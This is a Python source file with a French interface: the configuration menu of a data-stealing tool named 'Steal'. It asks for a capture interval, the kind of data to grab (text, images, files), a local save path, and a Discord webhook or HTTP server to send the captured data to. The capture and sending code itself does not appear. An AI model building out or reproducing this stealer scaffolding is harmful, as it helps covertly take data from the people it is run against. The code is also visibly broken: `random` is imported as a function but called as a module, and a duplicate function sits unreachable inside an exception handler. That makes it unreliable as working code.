import os
from random import random
import time
from colorama import Fore, Style

def clear():
    os.system("cls")

def affichage():
    clear()
    print("=== Configuration Steal ===\n\n")
    print(f"""
          
          Options : 
          
{Fore.WHITE}
    1. Intervalle de capture (en secondes) 'random' pour un temps entre 1 et 10 secondes
    2. Type de données à capturer (texte, images, etc.)
    3. Sauvegarde locale
        
         
          {Fore.YELLOW}Sortie et envoi:
{Fore.WHITE}
    4. Envoi sur discord
    5. Envoi sur serveur HTTP
    
  {Fore.GREEN}                    
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
                 
          """)
    
def steal_module():
    clear()
    print("=== Steal Configuration ===\n\n")
    choix = {
        "Intervalle de capture": None,
        "Type de données à capturer": None,
        "Sauvegarde locale": None,
        "Envoi sur Discord": None, 
        "Envoi sur serveur HTTP": None,
    } 

    def type_donnees():  
        clear()
        data_type = input("Définir le type de données à capturer (texte, images) : ")
        choix["Type de données à capturer"] = data_type
        print(f"Type de données à capturer défini sur {data_type}.")          

    def intervalle_capture():
        clear()
        print("Définir l'intervalle de capture en secondes.\n\n")

        intervalle = input("""Intervalle (secondes) 'random' pour un temps entre 1 et 10 secondes : """)
        try:
            if intervalle.lower() == 'random':
                intervalle = random.randint(1, 10)
                print(f"Intervalle défini sur {intervalle} secondes.")
                time.sleep(2)
                choix["Intervalle de capture"] = intervalle
            else:
                if int(intervalle) <= 0:
                    print(Fore.RED + "Veuillez entrer un nombre positif." + Style.RESET_ALL)
                    time.sleep(2)
                    return
                choix["Intervalle de capture"] = int(intervalle)
                print(f"Intervalle défini sur {intervalle} secondes.")
                time.sleep(2)
        except ValueError:  
            print(Fore.RED + "Veuillez entrer un nombre valide ou 'random'." + Style.RESET_ALL)
            time.sleep(2)


            def type_donnees():
                clear()
                print("Définir le type de données à capturer.\n\n")
                print("Options :")
                print("1. Texte")
                print("2. Images")
                print("3. Fichiers")
                print("4. Tous")

                choix_type = input("Choix : ")
                if choix_type == "1":
                    choix["Type de données à capturer"] = "Texte"
                    print("Type de données défini sur Texte.")
                    time.sleep(2)
                elif choix_type == "2":
                    choix["Type de données à capturer"] = "Images"
                    print("Type de données défini sur Images.")
                    time.sleep(2)
                elif choix_type == "3":
                    choix["Type de données à capturer"] = "Fichiers"
                    print("Type de données défini sur Fichiers.")
                    time.sleep(2)
                elif choix_type == "4":
                    choix["Type de données à capturer"] = "Tous"
                    print("Type de données défini sur Tous.")
                    time.sleep(2)
                else:
                    print(Fore.RED + "Choix invalide." + Style.RESET_ALL)
                    time.sleep(2)
    def sauvegarde_locale():
        clear()
        save_local = input("Entrez le chemin de sauvegarde locale (C:/path/to/save) (pas le nom du fichier): ")
        choix["Sauvegarde locale"] = save_local
    def envoi_discord():
        clear()
        webhook = input("Entrez l'URL du webhook discord : ")
        choix["Envoi sur Discord"] = webhook
    def envoi_http():
        clear()
        reponse = input("Entrez l'URL de votre serveur HTTP : ")
        choix["Envoi sur serveur HTTP"] = reponse
    options = [
        ("Intervalle de capture (en secondes)", intervalle_capture),
        ("Type de données à capturer (texte, images, etc.)" , type_donnees),
        ("Sauvegarde locale " , sauvegarde_locale),
        ("Envoi sur discord" , envoi_discord),
        ("Envoi sur serveur HTTP" , envoi_http)
    ]
    return choix, options 


